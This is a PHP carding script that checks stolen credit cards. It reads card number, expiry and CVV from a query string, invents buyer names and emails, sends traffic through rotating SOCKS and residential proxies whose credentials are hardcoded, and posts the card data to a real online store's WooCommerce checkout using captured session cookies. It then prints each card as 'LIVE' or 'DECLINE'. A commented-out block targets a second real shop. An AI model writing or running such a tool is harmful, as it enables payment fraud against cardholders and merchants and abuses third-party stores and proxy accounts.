<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

// $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
// $lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
// $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);




//============================================================================================================================================================
 // Request 1


// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcSavePaymentInfo/');
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_POST, 1);
// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// // curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
// # Uncomment the upper two lines if you have filled the upper login details
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'accept: */*',
// 'accept-encoding: gzip, deflate, br',
// 'accept-language: en-US,en;q=0.9',
// 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
// 'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
// 'origin: https://www.europeanestheticshop.com',
// 'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
// 'user-agent: '.$browser.''
// ));
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'CardholderName=Vincent+Warner&CardNumber='.$cc.'&ExpireMonth='.$mes1.'&ExpireYear='.$ano.'&CardCode='.$cvv.'');

// $b_pago = curl_exec($ch);

// curl_close($ch);

//    // echo $b_pago;
// // $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
// // // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
// // $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
// // $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
// // $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
// // $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://zodianz.com/?wc-ajax=checkout');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: PHPSESSID=a7acf4b9b36ed2adf295fcbf0594d81d; wordpress_logged_in_b9ae7e7c08ca63d7790dbd22f9ddd964=hotshot69%7C1591104686%7CROZ8vLyBRWgJhq8cq2rTSEs8OS7SseImWUct1rDpbcp%7C3a66325483a7a248938a861801054b5ab4d7471f6c4ed5d22fa4d21def65c0d3; _wp_session=cea2ce1dc209804311c2c66e96f2f2bc%7C%7C1590433318%7C%7C1650006118; wfwaf-authcookie-a05d541a58682044948ca1c492a67fb3=1163%7C%7C5e54b8ae5c3c3e6ff185afc347e097f7f3da29ec2d6835d5e025286f475fe1e6; wpSGCacheBypass=1; JCS_INENREF=https%3A//zodianz.com/cart/; JCS_INENTIM=1590390137888; _wpss_p_=N%3A2%20%7C%20WzFdW0Nocm9tZSBQREYgUGx1Z2luXSBbMl1bQ2hyb21lIFBERiBWaWV3ZXJdIA%3D%3D; woocommerce_items_in_cart=1; wp_woocommerce_session_b9ae7e7c08ca63d7790dbd22f9ddd964=1163%7C%7C1590562954%7C%7C1590559354%7C%7C4c8367874af4b62b6135ebe49e6692fb; woocommerce_cart_hash=584324920eabf25e5c6595513cec987f; _wpss_h_=6',
'origin: https://zodianz.com',
'referer: https://zodianz.com/checkout/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$nombre.'&billing_last_name='.$apellido.'&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=05182641524&billing_email=vvarner3%40gmail.com&order_comments=&payment_method=first_data_payeezy_gateway_credit_card&wc-first-data-payeezy-gateway-credit-card-account-number='.$cc.'&wc-first-data-payeezy-gateway-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-first-data-payeezy-gateway-credit-card-csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=445cc98ccb&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&0acb1f222af335f4838db2828d210d45=6f2277cdb80cb4dd04ced63e0a5e68a9');

// // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

$message = trim(strip_tags(getstr($result,'"message":"','"')));
 // $code = trim(strip_tags(getstr($result,'"status":"','"')));
 // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));


//////////////////////// BIN INFO ////////////////////////////////

/////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"result":"success"')){
    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';


   }
// elseif(strpos($result,'Insufficient Funds')){
//   echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
//    }
else {

       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ DECLINE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';

// updatecart();
}
curl_close($curl);
ob_flush();
       // echo $result;
//echo $browser;
?>
